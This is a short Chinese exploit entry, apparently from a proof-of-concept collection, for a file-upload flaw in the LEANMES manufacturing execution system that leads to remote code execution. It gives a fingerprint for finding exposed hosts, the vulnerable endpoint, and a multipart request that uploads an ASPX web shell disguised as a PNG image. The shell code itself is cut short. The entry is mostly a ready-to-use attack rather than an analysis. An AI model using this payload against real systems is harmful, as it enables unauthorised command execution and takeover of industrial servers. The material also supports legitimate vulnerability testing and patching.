# 深科特LEANMES系统ChooseImage存在文件上传致RCE漏洞

- **系统**：深科特LEANMES系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="LEAN MES - 用户登录"`
- **请求**：`POST /Kanban/ChooseImage.aspx HTTP/1.1`

**请求体 / payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
------WebKitFormBoundary
Content-Disposition: form-data; name="__VIEWSTATE"
/xxx
------WebKitFormBoundary
Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
xxx
------WebKitFormBoundary
Content-Disposition: form-data; name="__EVENTVALIDATION"
/xxx
------WebKitFormBoundary
Content-Disposition: form-data; name="imgName"
------WebKitFormBoundary
Content-Disposition: form-data; name="impUpload"; filename="test123.aspx"
Content-Type: image/png
<%@ Page Language="C#"%><% Response…（脚本共 917 字，完整版见原文）
```
- **预期**：200　|　—